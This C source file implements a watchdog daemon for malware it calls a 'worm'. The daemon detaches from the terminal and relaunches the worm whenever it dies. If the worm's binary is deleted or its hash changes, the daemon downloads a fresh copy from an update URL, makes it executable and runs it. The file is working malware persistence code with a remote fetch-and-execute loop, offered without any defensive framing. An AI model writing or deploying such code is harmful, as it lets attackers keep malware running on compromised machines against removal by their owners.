#define _GNU_SOURCE
#include "watchdog.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <limits.h>
#include <errno.h>
#include <openssl/sha.h>
#include <curl/curl.h>

#define CHECK_INTERVAL 30  
static size_t write_cb(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    return fwrite(ptr, size, nmemb, stream);
}

static int sha256_file(const char *path, unsigned char digest[SHA256_DIGEST_LENGTH]) {
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    SHA256_CTX ctx;
    SHA256_Init(&ctx);
    unsigned char buf[32768];
    size_t n;
    while ((n = fread(buf,1,sizeof(buf),f)) > 0) {
        SHA256_Update(&ctx, buf, n);
    }
    fclose(f);
    SHA256_Final(digest, &ctx);
    return 0;
}

// Download URL to outpath via curl
static int download_to(const char *url, const char *outpath) {
    CURL *c = curl_easy_init();
    if (!c) return -1;
    FILE *f = fopen(outpath, "wb");
    if (!f) { curl_easy_cleanup(c); return -1; }
    curl_easy_setopt(c, CURLOPT_URL, url);
    curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(c, CURLOPT_WRITEDATA, f);
    curl_easy_setopt(c, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(c, CURLOPT_TIMEOUT, 30L);
    CURLcode res = curl_easy_perform(c);
    fclose(f);
    curl_easy_cleanup(c);
    return (res == CURLE_OK) ? 0 : -1;
}

static pid_t spawn_worm(const char *path) {
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        execl(path, path, (char*)NULL);
        _exit(1);
    }
    return pid;
}

static int exists(const char *p) {
    struct stat st;
    return (stat(p, &st) == 0);
}

void start_watchdog(const char *worm_path, const char *update_url) {
    // Daemonize
    if (fork() > 0) exit(0);
    setsid();
    if (fork() > 0) exit(0);
    chdir("/");
    umask(0);

    // Initialize curl
    curl_global_init(CURL_GLOBAL_DEFAULT);

    // Compute initial hash
    unsigned char last_hash[SHA256_DIGEST_LENGTH] = {0};
    sha256_file(worm_path, last_hash);

    // Initial spawn
    pid_t child = -1;
    if (exists(worm_path)) {
        child = spawn_worm(worm_path);
    }

    while (1) {
        sleep(CHECK_INTERVAL);
        if (child > 0) {
            if (kill(child, 0) < 0 && errno == ESRCH) {
                waitpid(child, NULL, WNOHANG);
                child = -1;
            }
        }
        unsigned char new_hash[SHA256_DIGEST_LENGTH] = {0};
        int hash_ok = (sha256_file(worm_path, new_hash) == 0);
        int changed = hash_ok && memcmp(last_hash, new_hash, SHA256_DIGEST_LENGTH) != 0;
        if (child < 0 || !hash_ok || changed) {
            char tmp[PATH_MAX];
            snprintf(tmp, sizeof(tmp), "%s.tmp", worm_path);

            if (download_to(update_url, tmp) == 0) {
                chmod(tmp, 0755);
                rename(tmp, worm_path);
                sha256_file(worm_path, last_hash);
            }

            if (child > 0) {
                kill(child, SIGKILL);
                waitpid(child, NULL, 0);
            }
            if (exists(worm_path)) {
                child = spawn_worm(worm_path);
            }
        }
    }

    curl_global_cleanup();
}
